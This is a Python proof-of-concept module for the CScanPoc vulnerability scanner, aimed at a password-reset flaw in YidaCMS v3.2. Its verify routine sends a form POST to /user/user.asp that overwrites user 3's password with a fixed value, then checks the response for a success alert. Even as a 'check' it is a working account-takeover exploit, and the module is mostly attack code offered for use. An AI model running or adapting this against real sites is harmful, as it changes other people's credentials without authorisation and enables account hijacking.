# coding: utf-8
import re
import urllib
from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'YidaCMS_0101' # 平台漏洞编号，留空
    name = 'YidaCMS v3.2 /Yidacms/user/user.asp 远程密码修改' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2014-12-27'  # 漏洞公布时间
    desc = '''
        YidaCMS(易达CMS)重置密码时没有对帐号和原密码进行校验,导致可以任意重置任何用户密码
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源http://www.wooyun.org/bugs/wooyun-2014-073901
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'YidaCMS(易达CMS)'  # 漏洞应用名称
    product_version = '3.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ee3db49a-0651-447e-ab98-55fdc58c4819' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            vul_path = '%s/user/user.asp?yidacms=password&id=3'
            verify_url = vul_path % self.target
            data = {
                'shuaiweb_userpass':'test@beebeeto.com',
                'shuaiweb_userpass2':'test@beebeeto.com',
                'shuaiweb_useremail':'test@beebeeto.com',
                'shuaiweb_username': urllib.unquote('%CE%D2%B7%AE%BB%AA'),
                'shuaiweb_usertel': '',
                'shuaiweb_userqq': '',
                'shuaiweb_usermsn': '',
                'shuaiweb_useraddress': ''
            }

            response = requests.post(verify_url, data=data)
            content = response.content
            if u'alert(\'ä¿®æ¹æåï¼\');location.replace(\'user_pass.asp\')' in content.decode('GBK'):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                # passwd = 'test@beebeeto.com'
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()